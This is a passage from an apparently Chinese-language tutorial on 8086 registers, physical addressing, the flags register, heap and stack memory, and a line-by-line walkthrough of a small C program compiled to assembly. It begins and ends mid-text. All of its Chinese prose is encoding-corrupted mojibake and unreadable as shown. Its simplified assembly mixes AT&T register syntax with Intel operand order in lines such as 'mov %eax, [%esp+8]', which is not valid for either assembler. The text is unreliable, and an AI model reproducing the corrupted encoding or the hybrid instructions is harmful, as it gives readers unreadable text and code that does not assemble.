|==AH===|-----------1ä¸ªå­—èŠ‚ |===AL==|---1ä¸ªå­—èŠ‚ 2.6 ç‰©ç†åœ°å€ CPUè¦æƒ³è®¿é—®å†…å­˜å•å…ƒï¼Œå°±è¦ç»™å‡ºå†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€ï¼Œå†…å­˜æ˜¯ä¸€ä¸ªä¸€ç»´çš„çº¿æ€§ç©ºé—´ï¼Œæ¯ä¸€ä¸ªå†…å­˜å•å…ƒéƒ½æœ‰å”¯ä¸€çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯ç‰©ç†åœ°å€ã€‚ 8086CPUæ˜¯16ä½ç»“æ„çš„ï¼Œå…¶æ•°æ®æ€»çº¿æ˜¯16ä½å®½ï¼Œä½†åœ°å€æ€»çº¿æ˜¯20ä½ï¼Œ1MBå¯»å€èƒ½åŠ›ã€‚ ä½†å†…éƒ¨æ˜¯16ä½ç»“æ„ï¼Œå†…éƒ¨ä¸€æ¬¡æ€§å¤„ç†ã€ä¼ è¾“åœ°å€ä¸º16ä½ï¼Œæ‰€ä»¥åœ¨å†…éƒ¨é‡‡ç”¨2ä¸ª16ä½åœ°å€åˆæˆæ–¹å¼å½¢æˆä¸€ä¸ª20ä½çš„ç‰©ç†åœ°å€è¿›è¡Œå†…å­˜å¯»å€ã€‚ ç‰©ç†åœ°å€ = æ®µåœ°å€ * 16 + åç§»åœ°å€(æ®µåœ°å€*16å³å·¦ç§»4ä½) å…¶æœ¬è´¨å«ä¹‰æ˜¯ï¼šCPUåœ¨è®¿é—®å†…å­˜æ—¶ï¼Œç”¨ä¸€ä¸ªåŸºç¡€åœ°å€(æ®µåœ°å€*16)å’Œç›¸å¯¹äºåŸºç¡€åœ°å€çš„åç§»åœ°å€ç›¸åŠ ï¼Œå¾—åˆ°ç‰©ç†åœ°å€ã€‚ ç”±äºåç§»åœ°å€ä¸º16ä½ï¼Œ16ä½åœ°å€çš„å¯»å€èƒ½åŠ›æ˜¯64KBï¼Œæ‰€ä»¥ä¸€ä¸ªæ®µçš„é•¿åº¦æœ€å¤§ä¸º64Kã€‚ CPUå¯ä»¥ç”¨ä¸åŒçš„æ®µåœ°å€å’Œåç§»åœ°å€å½¢æˆåŒä¸€ä¸ªç‰©ç†åœ°å€ã€‚ 2.7 æ®µå¯„å­˜å™¨ 8086CPUæœ‰4ä¸ªæ®µå¯„å­˜å™¨ï¼šCSã€DSã€SSã€ESã€‚ CSä¸ºä»£ç æ®µå¯„å­˜å™¨ï¼ŒIPä¸ºæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ã€‚ ä»»æ„æ—¶åˆ»ï¼ŒCPUå°†CS:IPæŒ‡å‘çš„å†…å®¹å½“åšå½“å‰æŒ‡ä»¤æ‰§è¡Œã€‚ 8086CPUå·¥ä½œè¿‡ç¨‹ï¼š ä»CS:IPæŒ‡å‘çš„å†…å­˜å•å…ƒè¯»æŒ‡ä»¤ï¼ŒæŒ‡ä»¤è¿›æŒ‡ä»¤ç¼“å†²å™¨ IPæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ æ‰§è¡ŒæŒ‡ä»¤ï¼Œè·³åˆ°æ­¥éª¤1ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ CPUæ ¹æ®ä»€ä¹ˆå°†å†…å­˜ä¸­çš„ä¿¡æ¯çœ‹åšæŒ‡ä»¤ï¼Ÿç­”æ¡ˆæ˜¯CPUå°†CS:IPæŒ‡å‘çš„å†…å­˜å•å…ƒçš„å†…å®¹çœ‹åšæŒ‡ä»¤ã€‚ ä½¿ç”¨jmp æ®µåœ°å€:åç§»åœ°å€æˆ–jmp å¯„å­˜å™¨ä¿®æ”¹CS:IPæˆ–IPçš„åœ°å€ã€‚ åœ¨ç¼–ç¨‹æ—¶ï¼Œæ ¹æ®éœ€è¦å¯ä»¥å°†é•¿åº¦ä¸ºNçš„ä¸€ç»„ä»£ç ï¼Œå­˜åœ¨ä¸€ç»„è¿ç»­çš„å†…å­˜å•å…ƒä¸­ï¼Œè¿™æ®µå†…å­˜å•å…ƒå«åšä»£ç æ®µã€‚ åŒæ ·çš„ï¼Œå¯ä»¥æ ¹æ®éœ€è¦å°†é•¿åº¦ä¸ºNçš„ä¸€ç»„å†…å­˜å•å…ƒï¼Œä¸“é—¨å­˜å‚¨æ•°æ®ï¼Œè¿™æ®µå†…å­˜å•å…ƒå«åšæ•°æ®æ®µã€‚ 8086CPUè‡ªåŠ¨å–DSå¯„å­˜å™¨ä¸­çš„æ•°æ®ä¸ºå†…å­˜å•å…ƒçš„æ®µåœ°å€ã€‚ ä¾‹å¦‚mov [0] csè¡¨ç¤ºå°†å¯„å­˜å™¨csçš„å€¼å¤åˆ¶åˆ°æ®µåœ°å€ä¸ºDSåç§»åœ°å€ä¸º0çš„å†…å­˜å•å…ƒä¸­ã€‚ å­—åœ¨å†…å­˜ä¸­å­˜å‚¨æ—¶ï¼Œç”¨2ä¸ªåœ°å€è¿ç»­çš„å†…å­˜å•å…ƒå­˜æ”¾ï¼Œå­—çš„ä½å­—èŠ‚æ”¾åœ¨ä½åœ°å€å•å…ƒï¼Œé«˜å­—èŠ‚æ”¾åœ¨é«˜åœ°å€å•å…ƒã€‚ 2.8 æ ‡å¿—å¯„å­˜å™¨ æ ‡å¿—å¯„å­˜å™¨ä½œç”¨ï¼š å­˜å‚¨ç›¸å…³æŒ‡ä»¤æŸäº›æ‰§è¡Œç»“æœ ä¸ºCPUæ‰§è¡Œç›¸å…³æŒ‡ä»¤æä¾›è¡Œä¸ºä¾æ® æ§åˆ¶CPUç›¸å…³å·¥ä½œæ–¹å¼ 8086CPUä¸­æœ‰ä¸ªå«flagå¯„å­˜å™¨ï¼Œå…±16ä½ï¼Œæ¯ä¸€ä½ä»£è¡¨ä¸“é—¨çš„å«ä¹‰ï¼š ç¬¬6ä½ZFï¼Œé›¶æ ‡å¿—ä½ï¼šç›¸å…³æŒ‡ä»¤æ‰§è¡Œåï¼Œç»“æœä¸º0åˆ™zf=1ï¼Œä¸ä¸º0åˆ™zf=0 ç¬¬2ä½PFï¼Œå¥‡å¶æ ‡å¿—ä½ï¼šç›¸å…³æŒ‡ä»¤æ‰§è¡Œåï¼Œç»“æœæ‰€æœ‰bitä½ä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼Œpf=1ï¼Œå¦åˆ™pf=0 ç¬¬7ä½SFï¼Œç¬¦å·æ ‡å¿—ä½ï¼šç›¸å…³æŒ‡ä»¤æ‰§è¡Œåï¼Œç»“æœæ˜¯å¦ä¸ºè´Ÿï¼Œç»“æœä¸ºè´Ÿsf=1ï¼Œå¦åˆ™sf=0 ç¬¬0ä½CFï¼Œè¿›ä½æ ‡å¿—ä½ï¼šå¯¹äºæ— ç¬¦å·æ•°è¿ç®—ï¼ŒCFè®°å½•è¿ç®—ç»“æœæœ€é«˜æœ‰æ•ˆä½å‘æ›´é«˜ä½çš„è¿›ä½å€¼/å€Ÿä½å€¼ ç¬¬11ä½OFï¼Œæº¢å‡ºæ ‡å¿—ä½ï¼šå¯¹äºæœ‰ç¬¦å·æ•°è¿ç®—ï¼Œæ˜¯å¦å‘ç”Ÿæº¢å‡ºï¼Œæº¢å‡ºåˆ™of=1ï¼Œå¦åˆ™of=0 ç¬¬10ä½DFï¼Œæ–¹å‘æ ‡å¿—ä½ï¼šåœ¨ä¸²å¤„ç†æŒ‡ä»¤ä¸­ï¼Œæ§åˆ¶æ“ä½œåsiã€diå¢å‡ï¼Œdf=0æ¯æ¬¡æ“ä½œåsiã€dié€’å¢ï¼Œå¦åˆ™é€’å‡ 0x03 å†…å­˜æ¨¡å‹ï¼šHeap å¯„å­˜å™¨åªèƒ½å­˜æ”¾å¾ˆå°‘é‡çš„æ•°æ®ï¼Œå¤§å¤šæ•°æ—¶å€™ï¼ŒCPU è¦æŒ‡æŒ¥å¯„å­˜å™¨ï¼Œç›´æ¥è·Ÿå†…å­˜äº¤æ¢æ•°æ®ã€‚æ‰€ä»¥ï¼Œé™¤äº†å¯„å­˜å™¨ï¼Œè¿˜å¿…é¡»äº†è§£å†…å­˜æ€ä¹ˆå‚¨å­˜æ•°æ®ã€‚ ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šç»™å®ƒåˆ†é…ä¸€æ®µå†…å­˜ï¼Œç”¨æ¥å‚¨å­˜ç¨‹åºå’Œè¿è¡Œäº§ç”Ÿçš„æ•°æ®ã€‚è¿™æ®µå†…å­˜æœ‰èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€ï¼Œæ¯”å¦‚ä»0x1000åˆ°0x8000ï¼Œèµ·å§‹åœ°å€æ˜¯è¾ƒå°çš„é‚£ä¸ªåœ°å€ï¼Œç»“æŸåœ°å€æ˜¯è¾ƒå¤§çš„é‚£ä¸ªåœ°å€ã€‚ ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯¹äºåŠ¨æ€çš„å†…å­˜å ç”¨è¯·æ±‚ï¼ˆæ¯”å¦‚æ–°å»ºå¯¹è±¡ï¼Œæˆ–è€…ä½¿ç”¨mallocå‘½ä»¤ï¼‰ï¼Œç³»ç»Ÿå°±ä¼šä»é¢„å…ˆåˆ†é…å¥½çš„é‚£æ®µå†…å­˜ä¹‹ä¸­ï¼Œåˆ’å‡ºä¸€éƒ¨åˆ†ç»™ç”¨æˆ·ï¼Œå…·ä½“è§„åˆ™æ˜¯ä»èµ·å§‹åœ°å€å¼€å§‹åˆ’åˆ†ï¼ˆå®é™…ä¸Šï¼Œèµ·å§‹åœ°å€ä¼šæœ‰ä¸€æ®µé™æ€æ•°æ®ï¼Œè¿™é‡Œå¿½ç•¥ï¼‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è¦æ±‚å¾—åˆ°10ä¸ªå­—èŠ‚å†…å­˜ï¼Œé‚£ä¹ˆä»èµ·å§‹åœ°å€0x1000å¼€å§‹ç»™ä»–åˆ†é…ï¼Œä¸€ç›´åˆ†é…åˆ°åœ°å€0x100Aï¼Œå¦‚æœå†è¦æ±‚å¾—åˆ°22ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±åˆ†é…åˆ°0x1020ã€‚ è¿™ç§å› ä¸ºç”¨æˆ·ä¸»åŠ¨è¯·æ±‚è€Œåˆ’åˆ†å‡ºæ¥çš„å†…å­˜åŒºåŸŸï¼Œå«åš Heapï¼ˆå †ï¼‰ã€‚å®ƒç”±èµ·å§‹åœ°å€å¼€å§‹ï¼Œä»ä½ä½ï¼ˆåœ°å€ï¼‰å‘é«˜ä½ï¼ˆåœ°å€ï¼‰å¢é•¿ã€‚Heap çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹å°±æ˜¯ä¸ä¼šè‡ªåŠ¨æ¶ˆå¤±ï¼Œå¿…é¡»æ‰‹åŠ¨é‡Šæ”¾ï¼Œæˆ–è€…ç”±åƒåœ¾å›æ”¶æœºåˆ¶æ¥å›æ”¶ã€‚ 0x04 å†…å­˜æ¨¡å‹ï¼šStack é™¤äº† Heap ä»¥å¤–ï¼Œå…¶ä»–çš„å†…å­˜å ç”¨å«åš Stackï¼ˆæ ˆï¼‰ã€‚ç®€å•è¯´ï¼ŒStack æ˜¯ç”±äºå‡½æ•°è¿è¡Œè€Œä¸´æ—¶å ç”¨çš„å†…å­˜åŒºåŸŸã€‚ è¯·çœ‹ä¸‹é¢çš„ä¾‹å­ã€‚ int main() { int a = 2; int b = 3; } ä¸Šé¢ä»£ç ä¸­ï¼Œç³»ç»Ÿå¼€å§‹æ‰§è¡Œmainå‡½æ•°æ—¶ï¼Œä¼šä¸ºå®ƒåœ¨å†…å­˜é‡Œé¢å»ºç«‹ä¸€ä¸ªå¸§ï¼ˆframeï¼‰ï¼Œæ‰€æœ‰mainçš„å†…éƒ¨å˜é‡ï¼ˆæ¯”å¦‚aå’Œbï¼‰éƒ½ä¿å­˜åœ¨è¿™ä¸ªå¸§é‡Œé¢ã€‚mainå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œè¯¥å¸§å°±ä¼šè¢«å›æ”¶ï¼Œé‡Šæ”¾æ‰€æœ‰çš„å†…éƒ¨å˜é‡ï¼Œä¸å†å ç”¨ç©ºé—´ã€‚ å¦‚æœå‡½æ•°å†…éƒ¨è°ƒç”¨äº†å…¶ä»–å‡½æ•°ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ int main() { int a = 2; int b = 3; return add_a_and_b(a, b); } ä¸Šé¢ä»£ç ä¸­ï¼Œmainå‡½æ•°å†…éƒ¨è°ƒç”¨äº†add_a_and_bå‡½æ•°ã€‚æ‰§è¡Œåˆ°è¿™ä¸€è¡Œçš„æ—¶å€™ï¼Œç³»ç»Ÿä¹Ÿä¼šä¸ºadd_a_and_bæ–°å»ºä¸€ä¸ªå¸§ï¼Œç”¨æ¥å‚¨å­˜å®ƒçš„å†…éƒ¨å˜é‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤æ—¶åŒæ—¶å­˜åœ¨ä¸¤ä¸ªå¸§ï¼šmainå’Œadd_a_and_bã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè°ƒç”¨æ ˆæœ‰å¤šå°‘å±‚ï¼Œå°±æœ‰å¤šå°‘å¸§ã€‚ ç­‰åˆ°add_a_and_bè¿è¡Œç»“æŸï¼Œå®ƒçš„å¸§å°±ä¼šè¢«å›æ”¶ï¼Œç³»ç»Ÿä¼šå›åˆ°å‡½æ•°mainåˆšæ‰ä¸­æ–­æ‰§è¡Œçš„åœ°æ–¹ï¼Œç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼Œå°±å®ç°äº†å‡½æ•°çš„å±‚å±‚è°ƒç”¨ï¼Œå¹¶ä¸”æ¯ä¸€å±‚éƒ½èƒ½ä½¿ç”¨è‡ªå·±çš„æœ¬åœ°å˜é‡ã€‚ æ‰€æœ‰çš„å¸§éƒ½å­˜æ”¾åœ¨ Stackï¼Œç”±äºå¸§æ˜¯ä¸€å±‚å±‚å åŠ çš„ï¼Œæ‰€ä»¥ Stack å«åšæ ˆã€‚ç”Ÿæˆæ–°çš„å¸§ï¼Œå«åš\"å…¥æ ˆ\"ï¼Œè‹±æ–‡æ˜¯ pushï¼›æ ˆçš„å›æ”¶å«åš\"å‡ºæ ˆ\"ï¼Œè‹±æ–‡æ˜¯ popã€‚Stack çš„ç‰¹ç‚¹å°±æ˜¯ï¼Œæœ€æ™šå…¥æ ˆçš„å¸§æœ€æ—©å‡ºæ ˆï¼ˆå› ä¸ºæœ€å†…å±‚çš„å‡½æ•°è°ƒç”¨ï¼Œæœ€å…ˆç»“æŸè¿è¡Œï¼‰ï¼Œè¿™å°±å«åš\"åè¿›å…ˆå‡º\"çš„æ•°æ®ç»“æ„ã€‚æ¯ä¸€æ¬¡å‡½æ•°æ‰§è¡Œç»“æŸï¼Œå°±è‡ªåŠ¨é‡Šæ”¾ä¸€ä¸ªå¸§ï¼Œæ‰€æœ‰å‡½æ•°æ‰§è¡Œç»“æŸï¼Œæ•´ä¸ª Stack å°±éƒ½é‡Šæ”¾äº†ã€‚ Stack æ˜¯ç”±å†…å­˜åŒºåŸŸçš„ç»“æŸåœ°å€å¼€å§‹ï¼Œä»é«˜ä½ï¼ˆåœ°å€ï¼‰å‘ä½ä½ï¼ˆåœ°å€ï¼‰åˆ†é…ã€‚æ¯”å¦‚ï¼Œå†…å­˜åŒºåŸŸçš„ç»“æŸåœ°å€æ˜¯0x8000ï¼Œç¬¬ä¸€å¸§å‡å®šæ˜¯16å­—èŠ‚ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡åˆ†é…çš„åœ°å€å°±ä¼šä»0x7FF0å¼€å§‹ï¼›ç¬¬äºŒå¸§å‡å®šéœ€è¦64å­—èŠ‚ï¼Œé‚£ä¹ˆåœ°å€å°±ä¼šç§»åŠ¨åˆ°0x7FB0ã€‚ 8086CPUæä¾›å…¥æ ˆå’Œå‡ºæ ˆçš„æŒ‡ä»¤ï¼šPUSHå’ŒPOPï¼Œä»»æ„æ—¶åˆ»ï¼Œå¯„å­˜å™¨SS:SPæŒ‡å‘æ ˆé¡¶å…ƒç´ ã€‚ pushæŒ‡ä»¤æ‰§è¡Œï¼š SP=SP-2 å‘SS:SPæŒ‡å‘çš„å­—å•å…ƒé€å…¥æ•°æ® popæŒ‡ä»¤æ‰§è¡Œï¼š ä»SS:SPæŒ‡å‘çš„å­—å•å…ƒè¯»æ•°æ® SP=SP+2 åœ¨ç¼–ç¨‹æ—¶ï¼Œè¦æ—¶åˆ»æ³¨æ„æ ˆé¡¶è¶Šç•Œçš„é—®é¢˜ï¼Œç”¨æ ˆæ¥å¯ä»¥æš‚å­˜ä»¥åéœ€è¦æ¢å¤çš„å¯„å­˜å™¨ä¸­çš„å†…å®¹ã€‚ pushå’Œpopå®è´¨ä¸Šæ˜¯ä¸€ç§å†…å­˜ä¼ é€æŒ‡ä»¤ï¼ŒåŒæ ·çš„ï¼Œç¼–ç¨‹æ—¶æˆ‘ä»¬å¯ä»¥å°†é•¿åº¦ä¸ºNçš„ä¸€ç»„è¿ç»­å†…å­˜å•å…ƒå½“åšæ ˆç©ºé—´ä½¿ç”¨ï¼Œå«åšæ ˆæ®µã€‚ ä¸€ä¸ªæ ˆæ®µçš„å®¹é‡æœ€å¤§ä¸º64KBã€‚ 0x05 CPU æŒ‡ä»¤ 5.1 å®ä¾‹ äº†è§£å¯„å­˜å™¨å’Œå†…å­˜æ¨¡å‹ä»¥åï¼Œå°±å¯ä»¥æ¥çœ‹æ±‡ç¼–è¯­è¨€åˆ°åº•æ˜¯ä»€ä¹ˆäº†ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¨‹åºexample.cã€‚ int add_a_and_b(int a, int b) { return a + b; } int main() { return add_a_and_b(2, 3); } gcc å°†è¿™ä¸ªç¨‹åºè½¬æˆæ±‡ç¼–è¯­è¨€ã€‚ $ gcc -S example.c ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œä»¥åï¼Œä¼šç”Ÿæˆä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶example.sï¼Œé‡Œé¢å°±æ˜¯æ±‡ç¼–è¯­è¨€ï¼ŒåŒ…å«äº†å‡ åè¡ŒæŒ‡ä»¤ã€‚è¿™ä¹ˆè¯´å§ï¼Œä¸€ä¸ªé«˜çº§è¯­è¨€çš„ç®€å•æ“ä½œï¼Œåº•å±‚å¯èƒ½ç”±å‡ ä¸ªï¼Œç”šè‡³å‡ åä¸ª CPU æŒ‡ä»¤æ„æˆã€‚CPU ä¾æ¬¡æ‰§è¡Œè¿™äº›æŒ‡ä»¤ï¼Œå®Œæˆè¿™ä¸€æ­¥æ“ä½œã€‚ example.sç»è¿‡ç®€åŒ–ä»¥åï¼Œå¤§æ¦‚æ˜¯ä¸‹é¢çš„æ ·å­ã€‚ _add_a_and_b: push %ebx mov %eax, [%esp+8] mov %ebx, [%esp+12] add %eax, %ebx pop %ebx ret _main: push 3 push 2 call _add_a_and_b add %esp, 8 ret å¯ä»¥çœ‹åˆ°ï¼ŒåŸç¨‹åºçš„ä¸¤ä¸ªå‡½æ•°add_a_and_bå’Œmainï¼Œå¯¹åº”ä¸¤ä¸ªæ ‡ç­¾_add_a_and_bå’Œ_mainã€‚æ¯ä¸ªæ ‡ç­¾é‡Œé¢æ˜¯è¯¥å‡½æ•°æ‰€è½¬æˆçš„ CPU è¿è¡Œæµç¨‹ã€‚ æ¯ä¸€è¡Œå°±æ˜¯ CPU æ‰§è¡Œçš„ä¸€æ¬¡æ“ä½œã€‚å®ƒåˆåˆ†æˆä¸¤éƒ¨åˆ†ï¼Œå°±ä»¥å…¶ä¸­ä¸€è¡Œä¸ºä¾‹ã€‚ push %ebx è¿™ä¸€è¡Œé‡Œé¢ï¼Œpushæ˜¯ CPU æŒ‡ä»¤ï¼Œ%ebxæ˜¯è¯¥æŒ‡ä»¤è¦ç”¨åˆ°çš„è¿ç®—å­ã€‚ä¸€ä¸ª CPU æŒ‡ä»¤å¯ä»¥æœ‰é›¶ä¸ªåˆ°å¤šä¸ªè¿ç®—å­ã€‚ ä¸‹é¢æˆ‘å°±ä¸€è¡Œä¸€è¡Œè®²è§£è¿™ä¸ªæ±‡ç¼–ç¨‹åºï¼Œå»ºè®®è¯»è€…æœ€å¥½æŠŠè¿™ä¸ªç¨‹åºï¼Œåœ¨å¦ä¸€ä¸ªçª—å£æ‹·è´ä¸€ä»½ï¼Œçœå¾—é˜…è¯»çš„æ—¶å€™å†æŠŠé¡µé¢æ»šåŠ¨ä¸Šæ¥ã€‚ 5.2 push æŒ‡ä»¤ æ ¹æ®çº¦å®šï¼Œç¨‹åºä»_mainæ ‡ç­¾å¼€å§‹æ‰§è¡Œï¼Œè¿™æ—¶ä¼šåœ¨ Stack ä¸Šä¸ºmainå»ºç«‹ä¸€ä¸ªå¸§ï¼Œå¹¶å°† Stack æ‰€æŒ‡å‘çš„åœ°å€ï¼Œå†™å…¥ ESP å¯„å­˜å™¨ã€‚åé¢å¦‚æœæœ‰æ•°æ®è¦å†™å…¥mainè¿™ä¸ªå¸§ï¼Œå°±ä¼šå†™åœ¨ ESP å¯„å­˜å™¨æ‰€ä¿å­˜çš„åœ°å€ã€‚ ç„¶åï¼Œå¼€å§‹æ‰§è¡Œç¬¬ä¸€è¡Œä»£ç ã€‚ push 3 pushæŒ‡ä»¤ç”¨äºå°†è¿ç®—å­æ”¾å…¥ Stackï¼Œè¿™é‡Œå°±æ˜¯å°†3å†™å…¥mainè¿™ä¸ªå¸§ã€‚ è™½ç„¶çœ‹ä¸Šå»å¾ˆç®€å•ï¼ŒpushæŒ‡ä»¤å…¶å®æœ‰ä¸€ä¸ªå‰ç½®æ“ä½œã€‚å®ƒä¼šå…ˆå–å‡º ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€ï¼Œå°†å…¶å‡å»4ä¸ªå­—èŠ‚ï¼Œç„¶åå°†æ–°åœ°å€å†™å…¥ ESP å¯„å­˜å™¨ã€‚ä½¿ç”¨å‡æ³•æ˜¯å› ä¸º Stack ä»é«˜ä½å‘ä½ä½å‘å±•ï¼Œ4ä¸ªå­—èŠ‚åˆ™æ˜¯å› ä¸º3çš„ç±»å‹æ˜¯intï¼Œå ç”¨4ä¸ªå­—èŠ‚ã€‚å¾—åˆ°æ–°åœ°å€ä»¥åï¼Œ 3 å°±ä¼šå†™å…¥è¿™ä¸ªåœ°å€å¼€å§‹çš„å››ä¸ªå­—èŠ‚ã€‚ push 2 ç¬¬äºŒè¡Œä¹Ÿæ˜¯ä¸€æ ·ï¼ŒpushæŒ‡ä»¤å°†2å†™å…¥mainè¿™ä¸ªå¸§ï¼Œä½ç½®ç´§è´´ç€å‰é¢å†™å…¥çš„3ã€‚è¿™æ—¶ï¼ŒESP å¯„å­˜å™¨ä¼šå†å‡å» 4ä¸ªå­—èŠ‚ï¼ˆç´¯è®¡å‡å»8ï¼‰ã€‚ 5.3 call æŒ‡ä»¤ ç¬¬ä¸‰è¡Œçš„callæŒ‡ä»¤ç”¨æ¥è°ƒç”¨å‡½æ•°ã€‚ call _add_a_and_b ä¸Šé¢çš„ä»£ç è¡¨ç¤ºè°ƒç”¨add_a_and_bå‡½æ•°ã€‚è¿™æ—¶ï¼Œç¨‹åºå°±ä¼šå»æ‰¾_add_a_and_bæ ‡ç­¾ï¼Œå¹¶ä¸ºè¯¥å‡½æ•°å»ºç«‹ä¸€ä¸ªæ–°çš„å¸§ã€‚ ä¸‹é¢å°±å¼€å§‹æ‰§è¡Œ_add_a_and_bçš„ä»£ç ã€‚ push %ebx è¿™ä¸€è¡Œè¡¨ç¤ºå°† EBX å¯„å­˜å™¨é‡Œé¢çš„å€¼ï¼Œå†™å…¥_add_a_and_bè¿™ä¸ªå¸§ã€‚è¿™æ˜¯å› ä¸ºåé¢è¦ç”¨åˆ°è¿™ä¸ªå¯„å­˜å™¨ï¼Œå°±å…ˆæŠŠé‡Œé¢çš„å€¼å–å‡ºæ¥ï¼Œç”¨å®Œåå†å†™å›å»ã€‚ è¿™æ—¶ï¼ŒpushæŒ‡ä»¤ä¼šå†å°† ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€å‡å»4ä¸ªå­—èŠ‚ï¼ˆç´¯è®¡å‡å»12ï¼‰ã€‚ 5.4 mov æŒ‡ä»¤ movæŒ‡ä»¤ç”¨äºå°†ä¸€ä¸ªå€¼å†™å…¥æŸä¸ªå¯„å­˜å™¨ã€‚ mov %eax, [%esp+8] è¿™ä¸€è¡Œä»£ç è¡¨ç¤ºï¼Œå…ˆå°† ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€åŠ ä¸Š8ä¸ªå­—èŠ‚ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„åœ°å€ï¼Œç„¶åæŒ‰ç…§è¿™ä¸ªåœ°å€åœ¨ Stack å–å‡ºæ•°æ®ã€‚æ ¹æ®å‰é¢çš„æ­¥éª¤ï¼Œå¯ä»¥æ¨ç®—å‡ºè¿™é‡Œå–å‡ºçš„æ˜¯2ï¼Œå†å°†2å†™å…¥ EAX å¯„å­˜å™¨ã€‚ ä¸‹ä¸€è¡Œä»£ç ä¹Ÿæ˜¯å¹²åŒæ ·çš„äº‹æƒ…ã€‚ mov %ebx, [%esp+12] ä¸Šé¢çš„ä»£ç å°† ESP å¯„å­˜å™¨çš„å€¼åŠ 12ä¸ªå­—èŠ‚ï¼Œå†æŒ‰ç…§è¿™ä¸ªåœ°å€åœ¨ Stack å–å‡ºæ•°æ®ï¼Œè¿™æ¬¡å–å‡ºçš„æ˜¯3ï¼Œå°†å…¶å†™å…¥ EBX å¯„å­˜å™¨ã€‚ 5.5 add æŒ‡ä»¤ addæŒ‡ä»¤ç”¨äºå°†ä¸¤ä¸ªè¿ç®—å­ç›¸åŠ ï¼Œå¹¶å°†ç»“æœå†™å…¥ç¬¬ä¸€ä¸ªè¿ç®—å­ã€‚ add %eax, %ebx ä¸Šé¢çš„ä»£ç å°† EAX å¯„å­˜å™¨çš„å€¼ï¼ˆå³2ï¼‰åŠ ä¸Š EBX å¯„å­˜å™¨çš„å€¼ï¼ˆå³3ï¼‰ï¼Œå¾—åˆ°ç»“æœ5ï¼Œå†å°†è¿™ä¸ªç»“æœå†™å…¥ç¬¬ä¸€ä¸ªè¿ç®—å­ EAX å¯„å­˜å™¨ã€‚ 5.6 pop æŒ‡ä»¤ popæŒ‡ä»¤ç”¨äºå–å‡º Stack æœ€è¿‘ä¸€ä¸ªå†™å…¥çš„å€¼ï¼ˆå³æœ€ä½ä½åœ°å€çš„å€¼ï¼‰ï¼Œå¹¶å°†è¿™ä¸ªå€¼å†™å…¥è¿ç®—å­æŒ‡å®šçš„ä½ç½®ã€‚ pop %ebx ä¸Šé¢çš„ä»£ç è¡¨ç¤ºï¼Œå–å‡º Stack æœ€è¿‘å†™å…¥çš„å€¼ï¼ˆå³ EBX å¯„å­˜å™¨çš„åŸå§‹å€¼ï¼‰ï¼Œå†å°†è¿™ä¸ªå€¼å†™å› EBX å¯„å­˜å™¨ï¼ˆå› ä¸ºåŠ æ³•å·²ç»åšå®Œäº†ï¼ŒEBX å¯„å­˜å™¨ç”¨ä¸åˆ°äº†ï¼‰ã€‚ æ³¨æ„ï¼ŒpopæŒ‡ä»¤è¿˜ä¼šå°† ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€åŠ 4ï¼Œå³å›æ”¶4ä¸ªå­—èŠ‚ã€‚ 5.7 ret æŒ‡ä»¤ retæŒ‡ä»¤ç”¨äºç»ˆæ­¢å½“å‰å‡½æ•°çš„æ‰§è¡Œï¼Œå°†è¿è¡Œæƒäº¤è¿˜ç»™ä¸Šå±‚å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯ï¼Œå½“å‰å‡½æ•°çš„å¸§å°†è¢«å›æ”¶ã€‚ ret å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æŒ‡ä»¤æ²¡æœ‰è¿ç®—å­ã€‚ éšç€add_a_and_bå‡½æ•°ç»ˆæ­¢æ‰§è¡Œï¼Œç³»ç»Ÿå°±å›åˆ°åˆšæ‰mainå‡½æ•°ä¸­æ–­çš„åœ°æ–¹ï¼Œç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚ add %esp, 8 ä¸Šé¢çš„ä»£ç è¡¨ç¤ºï¼Œå°† ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€ï¼Œæ‰‹åŠ¨åŠ ä¸Š8ä¸ªå­—èŠ‚ï¼Œå†å†™å› ESP å¯„å­˜å™¨ã€‚è¿™æ˜¯å› ä¸º ESP å¯„å­˜å™¨çš„æ˜¯ Stack çš„å†™å…¥å¼€å§‹åœ°å€ï¼Œå‰é¢çš„popæ“ä½œå·²ç»å›æ”¶äº†4ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œå†å›æ”¶8ä¸ªå­—èŠ‚ï¼Œç­‰äºå…¨éƒ¨å›æ”¶ã€‚ ret æœ€åï¼Œmainå‡½æ•°è¿è¡Œç»“æŸï¼ŒretæŒ‡ä»¤é€€å‡ºç¨‹åºæ‰§è¡Œã€‚ 0x06 æ±‡ç¼–è¯­è¨€æŒ‡ä»¤ ç»ˆäºè¯´åˆ°æ±‡ç¼–å¸¸ç”¨æŒ‡ä»¤äº†ï¼Œå› ä¸º linux å’Œ windows 